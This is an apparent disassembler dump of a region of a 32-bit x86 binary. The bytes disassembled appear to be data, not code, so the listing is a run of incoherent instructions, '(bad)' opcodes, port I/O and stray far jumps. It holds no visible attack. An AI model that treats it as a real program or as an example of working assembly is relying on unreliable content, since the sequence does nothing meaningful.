  42c110:	mov    ebx,0x2903620e
  42c115:	ins    DWORD PTR es:[edi],dx
  42c116:	mov    al,0xf8
  42c118:	rol    BYTE PTR [eax],1
  42c11a:	rcr    esi,cl
  42c11c:	lahf   
  42c11d:	out    dx,eax
  42c11e:	sub    BYTE PTR [edx],al
  42c120:	jbe    0x42c0dc
  42c122:	or     al,BYTE PTR ds:0x192a1348
  42c128:	and    ebx,DWORD PTR [edi-0xa]
  42c12b:	out    dx,al
  42c12c:	and    eax,0xc2ddca77
  42c131:	aaa    
  42c132:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c134:	outs   dx,DWORD PTR ds:[esi]
  42c135:	sbb    eax,edx
  42c137:	std    
  42c138:	mov    ah,0x6c
  42c13a:	stos   BYTE PTR es:[edi],al
  42c13b:	lods   al,BYTE PTR ds:[esi]
  42c13c:	(bad)  
  42c13d:	xlat   BYTE PTR ds:[ebx]
  42c13e:	mov    esi,DWORD PTR [eax]
  42c140:	test   BYTE PTR [ecx+0x7f],0x31
  42c144:	push   ebp
  42c145:	fdiv   st,st(4)
  42c147:	sub    eax,0x915e728e
  42c14c:	inc    esp
  42c14d:	pop    esi
  42c14e:	into   
  42c14f:	add    BYTE PTR [ecx],0x59
  42c152:	push   ebp
  42c153:	dec    esp
  42c154:	ret    0x391
  42c157:	add    dh,BYTE PTR [ebx]
  42c159:	cmp    eax,0x646d9cdc
  42c15e:	sub    al,0x69
  42c160:	test   al,0x1b
  42c162:	xchg   bh,ch
  42c164:	in     al,0x46
  42c166:	fs lahf 
  42c168:	into   
  42c169:	pop    edx
  42c16a:	lahf   
  42c16b:	and    al,0x4a
  42c16d:	xor    dh,BYTE PTR [ecx-0x210eac33]
  42c173:	push   esp
  42c174:	fst    QWORD PTR [ebp+0xf]
  42c177:	iret   
  42c178:	mov    BYTE PTR [eax+0x13],ch
  42c17b:	clc    
  42c17c:	js     0x42c163
  42c17e:	mov    esi,0x119e2df9
  42c184:	pop    edx
  42c185:	out    0xdc,eax
  42c187:	fisub  WORD PTR [ebx+0x47]
  42c18a:	xchg   esp,eax
  42c18b:	adc    esp,DWORD PTR [ecx+0x91730c]
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	add    DWORD PTR [edi],edx
  42c202:	je     0x42c186
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	out    0x38,eax
  42c20e:	lods   eax,DWORD PTR ds:[esi]
  42c20f:	sbb    eax,0xcc75a199
  42c214:	daa    
  42c215:	loopne 0x42c273
  42c217:	out    0x8a,eax
  42c219:	lahf   
  42c21a:	imul   edx,DWORD PTR [ecx-0x35],0x97744a15
  42c221:	in     eax,0x5f
  42c223:	jp     0x42c23c
  42c225:	outs   dx,BYTE PTR ds:[esi]
  42c226:	jle    0x42c1b5
  42c228:	js     0x42c1df
  42c22a:	imul   BYTE PTR [edi]
  42c22c:	or     esp,esi
  42c22e:	shr    BYTE PTR [ecx],cl
  42c230:	gs mov esp,0x7a7da5fe
  42c236:	sbb    al,0x40
  42c238:	xchg   esp,eax
  42c239:	es push ss
  42c23b:	pop    ecx
  42c23c:	dec    esi
  42c23d:	push   edi
  42c23e:	nop
  42c23f:	inc    ebp
  42c240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c241:	pop    ds
  42c242:	ret    0x4d8d
  42c245:	inc    edx
  42c246:	pushf  
  42c247:	fnsave ds:0xad8da014
  42c24d:	pop    ebp
  42c24e:	(bad)  
  42c24f:	cmc    
  42c250:	ins    BYTE PTR es:[edi],dx
  42c251:	gs push cs
  42c253:	adc    BYTE PTR [ecx-0x21943d70],ch
  42c259:	lock push 0xb592fb18
  42c25f:	test   al,0x8f
  42c261:	iret   
  42c262:	add    esi,DWORD PTR [esi]
  42c264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c265:	es sbb ebp,edi
  42c268:	adc    BYTE PTR [esi+0x15],dl
  42c26b:	jne    0x42c1f1
  42c26d:	pop    edi
  42c26e:	aas    
  42c26f:	sbb    eax,esi
  42c271:	mov    ecx,0x6e49a9d3
  42c276:	push   ds
  42c277:	mov    esi,0xbf4a1a2e
  42c27c:	out    dx,al
  42c27d:	fnstenv [ecx-0x35]
  42c280:	mov    ecx,0x80458cde
  42c285:	jnp    0x42c2d2
  42c287:	xor    bl,al
  42c289:	and    cl,BYTE PTR [edi-0x83a2525]
  42c28f:	xchg   dl,cl
  42c291:	sbb    eax,DWORD PTR [ecx*1-0x2a6ad7f2]
  42c298:	(bad)  [esi]
  42c29a:	fidivr WORD PTR [ebx-0x6e85a715]
  42c2a0:	xor    eax,0x6fa2fd95
  42c2a5:	aaa    
  42c2a6:	mov    ebx,db7
  42c2a9:	jns    0x42c266
  42c2ab:	adc    BYTE PTR [eax-0xa],dl
  42c2ae:	cmp    ah,bl
  42c2b0:	aaa    
  42c2b1:	aam    0x4b
  42c2b3:	mov    dl,0x9b
  42c2b5:	push   esi
  42c2b6:	jge    0x42c257
  42c2b8:	pusha  
  42c2b9:	xchg   edx,eax
  42c2ba:	mov    ecx,ecx
  42c2bc:	xor    BYTE PTR [edx],dh
  42c2be:	leave  
  42c2bf:	rol    DWORD PTR [edi],cl
  42c2c1:	shl    BYTE PTR [esp+eiz*2+0x43],1
  42c2c5:	shrd   DWORD PTR [ecx-0x3f],eax,0x75
  42c2ca:	xlat   BYTE PTR ds:[ebx]
  42c2cb:	push   edx
  42c2cc:	lds    edi,FWORD PTR [eax-0x20]
  42c2cf:	xchg   esp,eax
  42c2d0:	push   esi
  42c2d1:	xor    eax,0x8ac142cf
  42c2d6:	ss iret 
  42c2d8:	cdq    
  42c2d9:	stc    
  42c2da:	adc    BYTE PTR [ebx+0x57],dh
  42c2dd:	push   esp
  42c2de:	mov    bh,0x68
  42c2e0:	and    al,0x41
  42c2e2:	xchg   DWORD PTR [eax+ebp*8],esp
  42c2e5:	sbb    DWORD PTR [edi+eiz*2+0x56],ebx
  42c2e9:	popa   
  42c2ea:	xor    al,0xe8
  42c2ec:	cmp    DWORD PTR [esi*8+0x5bac6bf1],edx
  42c2f3:	mov    eax,ds:0x671d7977
  42c2f8:	xchg   ebx,eax
  42c2f9:	test   DWORD PTR [eax],ebx
  42c2fb:	fidivr DWORD PTR [eax-0x38]
  42c2fe:	jne    0x42c374
  42c300:	add    DWORD PTR [ebp-0x69],0x55535f5
  42c307:	inc    ebp
  42c308:	push   0xffffffc2
  42c30a:	and    cl,BYTE PTR [ebp-0x70cc3231]
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xfb914f6
  42c383:	mov    al,0xe8
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	jns    0x42c30e
  42c38e:	jne    0x42c355
  42c390:	sar    BYTE PTR [eax+0x17eea598],1
  42c396:	pop    es
  42c397:	or     ebx,DWORD PTR [edi-0x7bebe20]
  42c39d:	fadd   DWORD PTR [ebx+0x12e03911]
  42c3a3:	je     0x42c345
  42c3a5:	mov    BYTE PTR [edi+ebp*4-0x9],0x56
  42c3aa:	lahf   
  42c3ab:	inc    edi
  42c3ac:	mov    ch,0xc3
  42c3ae:	cdq    
  42c3af:	call   0x9c173327
  42c3b4:	(bad)  
  42c3b5:	or     eax,0xb6622596
  42c3ba:	enter  0x8e52,0x79
  42c3be:	icebp  
  42c3bf:	fiadd  WORD PTR [edx-0x64887f6a]
  42c3c5:	inc    edx
  42c3c6:	jge    0x42c429
  42c3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3c9:	sti    
  42c3ca:	adc    ebp,ebp
  42c3cc:	pop    ebx
  42c3cd:	xor    ah,BYTE PTR [ebx+eax*2-0x5b323061]
  42c3d4:	mov    bh,0x6e
  42c3d6:	push   ebp
  42c3d7:	ret    0x587a
  42c3da:	sti    
  42c3db:	jmp    0x19a5:0x692792cb
  42c3e2:	leave  
  42c3e3:	adc    BYTE PTR [eax-0x4673a4e],0x7
  42c3ea:	aas    
  42c3eb:	xchg   ebp,eax
  42c3ec:	les    esp,FWORD PTR [ecx+0x4a]
  42c3ef:	pmuludq mm7,QWORD PTR [esi+0x50]
  42c3f3:	push   cs
  42c3f4:	out    0x81,al
  42c3f6:	cmp    cl,BYTE PTR [eax+0x5c7395e8]
  42c3fc:	loop   0x42c45c
  42c3fe:	(bad)  
  42c3ff:	mov    ebp,0x3b77a7ea
  42c404:	pusha  
  42c405:	jno    0x42c469
  42c407:	adc    DWORD PTR [eax],edx
  42c409:	jns    0x42c3b3
  42c40b:	inc    ebp
  42c40c:	mov    esp,0x9bd3a51c
  42c411:	jae    0x42c3c9
  42c413:	addr16 mov ebp,0x607537e3
  42c419:	shr    DWORD PTR [edi],0x24
  42c41c:	aad    0x7a
  42c41e:	mov    bh,ch
  42c420:	clc    
  42c421:	in     al,dx
  42c422:	and    eax,0x27479c43
  42c427:	sbb    DWORD PTR [ebx-0x1d],0xf960eb4c
  42c42e:	loopne 0x42c437
  42c430:	push   0xff0eb289
  42c435:	and    DWORD PTR [eax],ecx
  42c437:	lds    ebp,FWORD PTR [esi]
  42c439:	xor    al,0x73
  42c43b:	inc    dx
  42c43d:	scas   eax,DWORD PTR es:[edi]
  42c43e:	or     al,0x5e
  42c440:	loopne 0x42c499
  42c442:	addr16 push 0x6
  42c445:	pop    ebx
  42c446:	xchg   esp,eax
  42c447:	retf   0xccad
  42c44a:	push   cs
  42c44b:	gs inc edi
  42c44d:	xor    eax,0x10b915e6
  42c452:	cmp    eax,0x8d56e758
  42c457:	add    eax,0xb52f9591
  42c45c:	cmp    al,0xaf
  42c45e:	mov    ebp,0xb665da16
  42c463:	dec    eax
  42c464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c465:	(bad)  
  42c466:	mov    eax,ds:0xb06a9d0e
  42c46b:	ret    0xe0ff
  42c46e:	leave  
  42c46f:	retf   
  42c470:	add    eax,0xa55eed6b
  42c475:	loopne 0x42c462
  42c477:	push   es
  42c478:	jb     0x42c43f
  42c47a:	xchg   esi,eax
  42c47b:	mov    edx,0xc2795e0
  42c480:	int3   
  42c481:	call   0x456c:0x24f42510
  42c488:	enter  0xb505,0x9f
  42c48c:	in     al,0x65
  42c48e:	push   edi
  42c48f:	pushf  
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xfb34,0x54
  42c502:	or     BYTE PTR [ecx-0x14],bl
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	dec    eax
  42c50d:	dec    ebp
  42c50e:	jl     0x42c4a6
  42c510:	xchg   ebx,eax
  42c511:	sbb    DWORD PTR [ebx],esp
  42c513:	fadd   QWORD PTR [ebp+0xddee2db]
  42c519:	sub    al,0x6f
  42c51b:	xlat   BYTE PTR ds:[ebx]
  42c51c:	cli    
  42c51d:	mov    dl,0x5a
  42c51f:	mov    BYTE PTR [ebx+0x77940cfd],cl
  42c525:	push   cs
  42c526:	mov    ah,0xd7
  42c528:	out    0xcc,eax
  42c52a:	out    0x33,eax
  42c52c:	mov    ds:0xa774acc3,eax
  42c531:	pop    esi
  42c532:	push   edi
  42c533:	in     eax,0x5
  42c535:	inc    ebx
  42c536:	mov    ah,0x7d
  42c538:	push   ecx
  42c539:	sub    ebp,0xffffffd7
  42c53c:	jns    0x42c55a
  42c53e:	dec    esp
  42c53f:	out    0x3d,eax
  42c541:	stos   BYTE PTR es:[edi],al
  42c542:	lods   eax,DWORD PTR ds:[esi]
  42c543:	pop    es
  42c544:	pop    ebp
  42c545:	and    BYTE PTR [edi],0x2
  42c548:	dec    edx
  42c549:	aas    
  42c54a:	lahf   
  42c54b:	adc    ebx,DWORD PTR [ecx+0x6229c40f]
  42c551:	mov    esi,0x53c89b85
  42c556:	lods   eax,DWORD PTR ds:[esi]
  42c557:	iret   
  42c558:	in     al,0x35
  42c55a:	(bad)  [ebx-0x42]
  42c55d:	xor    al,0xbd
  42c55f:	aad    0x8
  42c561:	out    dx,eax
  42c562:	mov    cl,0xc4
  42c564:	sub    BYTE PTR [ebx+eax*2],0x90
  42c568:	jle    0x42c544
  42c56a:	mov    DWORD PTR [esp+ebp*2-0x687b1ed1],ebp
  42c571:	cs inc ecx
  42c573:	ret    
  42c574:	test   al,0xe4
  42c576:	or     eax,0xa94567b5
  42c57b:	(bad)  
  42c57c:	loope  0x42c5d1
  42c57e:	sub    cl,cl
  42c580:	popa   
  42c581:	jp     0x42c5da
  42c583:	adc    DWORD PTR [ecx+0x50],0x9f6b7a77
  42c58a:	adc    eax,0x7a421cd2
  42c58f:	inc    ebx
  42c590:	fimul  DWORD PTR [ebp-0x3b0d98c5]
  42c596:	in     eax,0xff
  42c598:	cmp    bh,BYTE PTR [eax-0x66c0ef25]
  42c59e:	sbb    esi,DWORD PTR ds:0xbaa7d01e
  42c5a4:	lahf   
  42c5a5:	sahf   
  42c5a6:	pop    edx
  42c5a7:	sub    ebp,0x6e
  42c5aa:	loopne 0x42c604
  42c5ac:	adc    dl,BYTE PTR [edx+0x23]
  42c5af:	xchg   esi,eax
  42c5b0:	nop
  42c5b1:	mov    WORD PTR [edi+0x6a],fs
  42c5b4:	int    0x7e
  42c5b6:	cmp    al,0xf4
  42c5b8:	cmp    DWORD PTR [esi],esi
  42c5ba:	into   
  42c5bb:	inc    ecx
  42c5bc:	pop    esp
  42c5be:	dec    edi
  42c5bf:	adc    al,al
  42c5c1:	dec    edi
  42c5c2:	push   ebx
  42c5c3:	ret    0xebe
  42c5c6:	pop    esp
  42c5c7:	gs xchg esp,eax
  42c5c9:	pop    edx
  42c5ca:	arpl   WORD PTR [esi+0x78],dx
  42c5cd:	scas   al,BYTE PTR es:[edi]
  42c5ce:	das    
  42c5cf:	mov    esi,0xd6f6ceb1
  42c5d4:	add    eax,0x1e7f9a7e
  42c5d9:	out    0x93,al
  42c5db:	rol    BYTE PTR [ebp-0x66],0x56
  42c5df:	fsubr  DWORD PTR [edx+ecx*8+0x6a]
  42c5e3:	int    0x35
  42c5e5:	mov    edx,0x2b747be2
  42c5ea:	(bad)  
  42c5eb:	clc    
  42c5ec:	mov    ecx,0xd3e97b34
  42c5f1:	add    eax,0x8d0afce9
  42c5f6:	mov    eax,0x4fbbc96
  42c5fb:	call   0x2e6c:0x283ff5c3
  42c602:	or     DWORD PTR [ebx-0x71],0xffffffe9
  42c606:	jge    0x42c650
  42c608:	pop    es
  42c609:	push   edi
  42c60a:	lea    edx,[edi]
  42c60c:	aad    0x5f
  42c60e:	pop    ebp
  42c60f:	cmp    BYTE PTR [eax],al
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x2a920395]
  42c681:	sbb    ah,BYTE PTR [ecx+0x13]
  42c684:	lock fiadd DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	xor    dl,BYTE PTR [ebp+0xd]
  42c68f:	(bad)  
  42c690:	test   DWORD PTR ds:0x78fa8bbd,0x40926442
  42c69a:	push   cs
  42c69b:	and    DWORD PTR [esi+0x4aed971e],esi
  42c6a1:	daa    
  42c6a2:	sbb    edi,edi
  42c6a4:	and    ecx,esi
  42c6a6:	jb     0x42c63c
  42c6a8:	inc    eax
  42c6a9:	mov    edx,0xfe674ac6
  42c6ae:	iret   
  42c6af:	adc    al,0x45
  42c6b1:	sub    esp,DWORD PTR [esi+eiz*1-0x3008a748]
  42c6b8:	xchg   ebx,eax
  42c6b9:	push   0xffffff90
  42c6bb:	sbb    eax,0x424c6feb
  42c6c0:	mov    ah,0xf5
  42c6c2:	int3   
  42c6c3:	test   BYTE PTR [eax],cl
  42c6c5:	psrad  mm5,QWORD PTR [esi]
  42c6c8:	aad    0x9
  42c6ca:	icebp  
  42c6cb:	inc    ebp
  42c6cc:	sbb    dl,BYTE PTR [edx+0x42]
  42c6cf:	test   eax,0x4042a002
  42c6d4:	mul    BYTE PTR [eax-0x46b34629]
  42c6da:	add    eax,0x4edcbd22
  42c6df:	rcr    DWORD PTR [edi-0x502004bb],1
  42c6e5:	call   0x15ea:0x98152ad5
  42c6ec:	retf   0x53b0
  42c6ef:	ds cli 
  42c6f1:	lods   eax,DWORD PTR ds:[esi]
  42c6f2:	jmp    0x281a404d
  42c6f7:	es jno 0x42c748
  42c6fa:	scas   eax,DWORD PTR es:[edi]
  42c6fb:	xor    BYTE PTR [esi-0x80],ah
  42c6fe:	(bad)  
  42c6ff:	push   cs
  42c700:	sbb    eax,0x26676d88
  42c705:	xchg   edi,eax
  42c706:	sbb    BYTE PTR [ebx-0x84b5100],bl
  42c70c:	iret   
  42c70d:	ja     0x42c739
  42c70f:	gs ret 
  42c711:	fadd   DWORD PTR [ebx+0x23f4978]
  42c717:	inc    ecx
  42c718:	xchg   edi,eax
  42c719:	jbe    0x42c71d
  42c71b:	ds push eax
  42c71d:	xor    DWORD PTR [esi+0x42],ecx
  42c720:	outs   dx,DWORD PTR ds:[esi]
  42c721:	into   
  42c722:	cmp    BYTE PTR [ebx],ch
  42c724:	or     al,0xba
  42c726:	cmc    
  42c727:	mov    ecx,0x864c3e45
  42c72c:	sub    eax,0x8e1cb0bb
  42c731:	es leave 
  42c733:	aad    0x0
  42c735:	fs (bad) 
  42c737:	push   edi
  42c738:	std    
  42c739:	mov    edx,ebx
  42c73b:	outs   dx,DWORD PTR ds:[esi]
  42c73c:	cwde   
  42c73d:	add    al,0xdf
  42c73f:	jb     0x42c797
  42c741:	fsub   QWORD PTR [esi+0xb74ad1c]
  42c747:	xor    BYTE PTR [edi],dh
  42c749:	ficom  WORD PTR [ebx+ebp*8-0x79]
  42c74d:	mov    bl,0xae
  42c74f:	jne    0x42c704
  42c751:	or     BYTE PTR [edi],dh
  42c753:	mov    dh,dh
  42c755:	push   edx
  42c756:	fild   WORD PTR [edi-0x4e195ed8]
  42c75c:	xor    ecx,eax
  42c75e:	mov    bh,0x3a
  42c760:	jae    0x42c7ba
  42c762:	rcl    DWORD PTR [edx],0x80
  42c765:	ret    0xb02f
  42c768:	dec    eax
  42c769:	dec    BYTE PTR ds:[esi]
  42c76c:	pop    ds
  42c76d:	and    al,0xd8
  42c76f:	not    DWORD PTR [esi+ecx*8+0x21]
  42c773:	adc    BYTE PTR gs:[eax+esi*1],dl
  42c777:	pop    es
  42c778:	adc    eax,0xdbb948fe
  42c77d:	into   
  42c77e:	int    0xdf
  42c780:	(bad)  
  42c781:	cmp    BYTE PTR [esp+ecx*2],ah
  42c784:	xrelease mov DWORD PTR [eax+0x49],edi
  42c788:	imul   edi,DWORD PTR [eax+0x449538],0x57fb
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	out    dx,eax
  42c801:	loopne 0x42c7aa
  42c803:	aad    0xf4
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	sub    cl,dh
  42c80e:	push   ds
  42c80f:	mov    bl,0x1c
  42c811:	xchg   edi,eax
  42c812:	and    ebx,DWORD PTR [edi-0x6]
  42c815:	and    BYTE PTR [ebx],bl
  42c817:	mov    ebp,0xc46aa175
  42c81c:	mov    DWORD PTR [edi-0xa],esi
  42c81f:	jp     0x42c819
  42c821:	pushf  
  42c822:	sbb    esi,edi
  42c824:	or     BYTE PTR [ecx-0x5f],0xa1
  42c828:	in     eax,dx
  42c829:	(bad)  
  42c82a:	xchg   ebx,eax
  42c82b:	dec    esp
  42c82c:	loopne 0x42c7ff
  42c82e:	xor    esi,ebx
  42c830:	popf   
  42c831:	bt     eax,edi
  42c834:	jmp    0x42c825
  42c836:	push   0x7d
  42c838:	dec    edx
  42c839:	mov    dh,0xbf
  42c83b:	jle    0x42c8b7
  42c83d:	sub    BYTE PTR [edx-0x64],al
  42c840:	fadd   DWORD PTR [eax]
  42c842:	sbb    BYTE PTR [ecx+0x640030a8],al
  42c848:	lea    ebp,[ebx+0x28]
  42c84b:	sub    BYTE PTR [ebp-0x64],dl
  42c84e:	pop    eax
  42c84f:	and    al,0x3
  42c851:	jge    0x42c836
  42c853:	out    0xf9,ax
  42c856:	ror    BYTE PTR [edi],0x1d
  42c859:	sbb    al,0x98
  42c85b:	hlt    
  42c85c:	imul   ebx,eax,0xffffffda
  42c85f:	add    BYTE PTR [esi-0x5a0df69],ah
  42c865:	lods   al,BYTE PTR ds:[esi]
  42c866:	xchg   ebp,eax
  42c867:	(bad)  
  42c868:	not    dh
  42c86a:	adc    bl,ah
  42c86c:	xor    DWORD PTR [esi+eiz*8+0x5a7b250a],0x2f396eee
  42c877:	xor    eax,0xc1097d31
  42c87c:	in     eax,0xfe
  42c87e:	push   eax
  42c87f:	add    al,0xfe
  42c881:	clc    
  42c882:	inc    edx
  42c883:	mul    BYTE PTR [edx]
  42c885:	sub    al,0x41
  42c887:	shr    DWORD PTR [eax],0x2d
  42c88a:	sub    al,0xce
  42c88c:	inc    esp
  42c88d:	add    DWORD PTR [esi+ebp*4],eax
  42c890:	dec    ebp
  42c891:	push   esp
  42c892:	mov    ?,WORD PTR [eax-0x47a3f4c2]
  42c898:	fwait
  42c899:	dec    eax
  42c89a:	pop    esp
  42c89b:	jmp    0xa77b60f5
  42c8a0:	in     al,dx
  42c8a1:	stos   DWORD PTR es:[edi],eax
  42c8a2:	pop    es
  42c8a3:	mov    ebx,0xe8ff758b
  42c8a8:	arpl   dx,sp
  42c8aa:	mov    esp,0x3a84009b
  42c8af:	ins    DWORD PTR es:[edi],dx
  42c8b0:	pop    edx
  42c8b1:	mov    edi,0xa38de64d
  42c8b6:	dec    esp
  42c8b7:	push   esp
  42c8b8:	sub    edx,DWORD PTR [esi]
  42c8ba:	pop    edx
  42c8bb:	push   ebp
  42c8bc:	sub    al,0x8b
  42c8be:	nop
  42c8bf:	mov    ds:0xebfbf619,al
  42c8c4:	dec    ebx
  42c8c5:	into   
  42c8c6:	dec    edi
  42c8c7:	pop    ebx
  42c8c8:	jl     0x42c877
  42c8ca:	jne    0x42c889
  42c8cc:	in     eax,dx
  42c8cd:	popf   
  42c8ce:	(bad)  
  42c8cf:	mov    eax,ds:0x15d5d594
  42c8d4:	or     ebp,0xffffffb3
  42c8d7:	add    esi,eax
  42c8d9:	xchg   ecx,eax
  42c8da:	repnz loopne 0x42c88e
  42c8dd:	jo     0x42c934
  42c8df:	stc    
  42c8e0:	mov    eax,ds:0x849f0af4
  42c8e5:	dec    esi
  42c8e6:	neg    BYTE PTR [edi+esi*8]
  42c8e9:	add    BYTE PTR [edx],dl
  42c8eb:	dec    ebx
  42c8ec:	cs push es
  42c8ee:	scas   al,BYTE PTR es:[edi]
  42c8ef:	sbb    al,0x2e
  42c8f1:	fisttp QWORD PTR [esi-0x708176e7]
  42c8f7:	pop    es
  42c8f8:	adc    dh,ah
  42c8fa:	clc    
  42c8fb:	cmp    ebp,ebx
  42c8fd:	scas   eax,DWORD PTR es:[edi]
  42c8fe:	xchg   esi,eax
  42c8ff:	lahf   
  42c900:	arpl   WORD PTR [eax+0x2f],bx
  42c903:	xor    bh,0x9b
  42c906:	inc    ecx
  42c907:	adc    edi,esp
  42c909:	xchg   ecx,eax
  42c90a:	les    ebx,FWORD PTR [esp+ebx*1+0x9c3ce8]
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xa22eb66b
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	dec    eax
  42c98d:	addr16 mov dh,0x46
  42c990:	in     eax,0x37
  42c992:	cmp    DWORD PTR [ecx],0xffffffe8
  42c995:	cld    
  42c996:	bnd jg 0x42c955
  42c999:	pop    esi
  42c99a:	xor    al,0x31
  42c99c:	in     al,dx
  42c99d:	shl    ebp,0x0
  42c9a0:	cmp    bh,BYTE PTR [ebp+eax*2-0x51432b09]
  42c9a7:	retf   
  42c9a8:	and    esp,esi
  42c9aa:	and    BYTE PTR [ebp+0x42b42d89],cl
  42c9b0:	push   ebp
  42c9b1:	retf   0x4890
  42c9b4:	pop    eax
  42c9b5:	cmp    al,0x18
  42c9b7:	popa   
  42c9b8:	jo     0x42c974
  42c9ba:	jne    0x42c9da
  42c9bc:	pop    ss
  42c9bd:	xchg   edx,eax
  42c9be:	mov    eax,ds:0x81862243
  42c9c3:	pop    ss
  42c9c4:	push   esi
  42c9c5:	xor    ebx,DWORD PTR ds:0x9d301f15
  42c9cb:	sub    ebx,DWORD PTR [esi+0x440ccb77]
  42c9d1:	int    0x3d
  42c9d3:	adc    ebp,DWORD PTR [ebp+0xa]
  42c9d6:	mov    BYTE PTR [edx+0x3],al
  42c9d9:	shl    BYTE PTR [ebp-0x12],cl
  42c9dc:	test   BYTE PTR ds:0x72131c22,bl
  42c9e2:	xor    al,0x50
  42c9e4:	xchg   BYTE PTR [ecx+0x18b726b7],bl
  42c9ea:	add    eax,DWORD PTR [ecx]
  42c9ec:	retf   0x4c96
  42c9ef:	push   es
  42c9f0:	cmp    ecx,DWORD PTR [ebp+0x57]
  42c9f3:	jmp    0xebcfc98d
  42c9f8:	loopne 0x42ca56
  42c9fa:	mov    ah,0x7
  42c9fc:	xor    eax,edx
  42c9fe:	adc    dl,BYTE PTR [ecx]
  42ca00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca01:	jne    0x42c9fd
  42ca03:	adc    esi,DWORD PTR [ebx+0x63]
  42ca06:	and    ch,BYTE PTR [ecx-0x2c2800f8]
  42ca0c:	popa   
  42ca0d:	add    ecx,DWORD PTR [ebp+eax*4+0x5686f9d5]
  42ca14:	sub    eax,0x9f0a8111
  42ca19:	lods   al,BYTE PTR ds:[esi]
  42ca1a:	imul   eax,DWORD PTR [edi-0x3e3f1e12],0xb5951746
  42ca24:	sbb    al,0xd2
  42ca26:	call   esp
  42ca28:	pop    eax
  42ca29:	xor    edi,DWORD PTR [edx-0x13]
  42ca2c:	sub    BYTE PTR [esi+ebp*1],0x6c
  42ca30:	xchg   ebx,eax
  42ca31:	out    0x5f,al
  42ca33:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42ca35:	push   0x2ef0d8dd
  42ca3a:	icebp  
  42ca3b:	iret   
  42ca3c:	push   cs
  42ca3d:	sub    ebp,DWORD PTR [edi+0x67687410]
  42ca43:	into   
  42ca44:	jbe    0x42ca20
  42ca46:	das    
  42ca47:	inc    esp
  42ca48:	ja     0x42ca3a
  42ca4a:	jl     0x42ca88
  42ca4c:	jns    0x42ca08
  42ca4e:	or     DWORD PTR [eax],eax
  42ca50:	loope  0x42ca0a
  42ca52:	mov    cl,0x5b
  42ca54:	ret    0x4687
  42ca57:	sub    esi,DWORD PTR [edx-0x35718f42]
  42ca5d:	nop
  42ca5e:	jmp    edi
  42ca60:	or     DWORD PTR [edx+ecx*4-0x72cfd58],ebx
  42ca67:	inc    eax
  42ca68:	shl    DWORD PTR ds:0xf612f078,0x8b
  42ca6f:	push   es
  42ca70:	test   BYTE PTR [edx-0xca27944],ch
  42ca76:	jp     0x42ca0c
  42ca78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca79:	imul   eax,DWORD PTR [eax+0xb],0x42654068
  42ca80:	dec    edx
  42ca81:	jns    0x42cae5
  42ca83:	adc    eax,0x41f1f50d
  42ca88:	mov    edx,0x211f1328
  42ca8d:	arpl   WORD PTR ds:0x91,cx
	...
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x532b6ec0]
  42cb02:	inc    edx
  42cb03:	out    0xfc,eax
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	fisub  DWORD PTR cs:0xbc107239
  42cb13:	and    al,0xa0
  42cb15:	mov    ds:0xa7a17ef1,eax
  42cb1a:	push   ss
  42cb1b:	and    bl,bl
  42cb1d:	jg     0x42cb07
  42cb1f:	xor    dh,0xab
  42cb22:	loop   0x42cb8d
  42cb24:	dec    DWORD PTR [ecx]
  42cb26:	mov    BYTE PTR [edi-0x1c6d73ce],bl
  42cb2c:	dec    esi
  42cb2d:	inc    edi
